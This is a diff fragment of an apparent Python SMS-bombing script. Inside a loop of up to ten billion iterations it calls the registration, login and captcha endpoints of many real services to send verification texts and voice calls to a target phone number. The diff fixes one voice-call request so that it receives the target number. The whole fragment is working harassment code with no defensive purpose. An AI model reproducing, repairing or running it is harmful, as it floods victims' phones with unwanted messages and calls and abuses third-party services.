@@ -80,7 +80,7 @@ while i<10000000000:
       qq = requests.get('http://vip.17s.cn/api/user/sendcode.html?username=%s&type=register&access-token='%(mc))
       qq = requests.get('http://m.qiuyi.cn/dengta/Sendmessage/sendCode?mobile=%s&type=2'%(mc))
       qq = requests.get('http://sdk.fante.com/user/?ac=sendSmsCode&phone=%s&type=phoneLogin&game_id=596&game_pkg=platform_game_A&partner_id=7&uuid=0&ad_id=&channel_id=&sub_channel_id=&ad_channel_id=&jsoncallback=jQuery33103684337562589668_1626751805291&_=1626751805293'%(mc))
-      qq = requests.get('http://h5.member.iachina.cn/h5/api/send_captcha?tel=%s&captcha_type=ivr'%())
+      qq = requests.get('http://h5.member.iachina.cn/h5/api/send_captcha?tel=%s&captcha_type=ivr'%(mc))
       qq = requests.get('http://h5.member.iachina.cn/h5/api/send_captcha?tel=%s&captcha_type=sms'%(mc))
       qq = requests.get('http://weixin.askci.com/tool/GetPhoneValidateCode?phone='+mc)
       qq = requests.get('http://zddzd.wddcn.com/vshop/reg.html?sid=1869558&ref=center.html?sid=1869558&action=code&phone=%s&sendsmskey=450124&callback=jsonpcallback_1630813844539_1400686033559968&ver=201402141327'%(mc))
